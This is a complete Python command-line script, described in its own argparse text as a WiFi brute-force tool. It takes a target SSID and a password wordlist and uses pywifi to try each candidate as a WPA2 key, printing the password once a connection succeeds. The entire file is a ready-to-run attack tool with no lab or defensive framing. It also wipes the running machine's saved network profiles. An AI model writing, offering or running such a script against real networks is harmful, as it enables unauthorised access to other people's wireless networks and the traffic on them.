import argparse
from tqdm import tqdm
import pywifi
from pywifi import const

def connect_wifi(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='WiFi Bruteforce script')
    parser.add_argument('ssid', type=str, help='Target WiFi SSID')
    parser.add_argument('wordlist', type=str, help='File containing passwords (one per line)')
    args = parser.parse_args()

    with open(args.wordlist, 'r') as f:
        passwords = f.read().splitlines()

    pbar = tqdm(total=len(passwords))
    for password in passwords:
        if connect_wifi(args.ssid, password):
            print(f'Password found: {password}')
            break
        pbar.update(1)
    else:
        print('Password not found in wordlist')
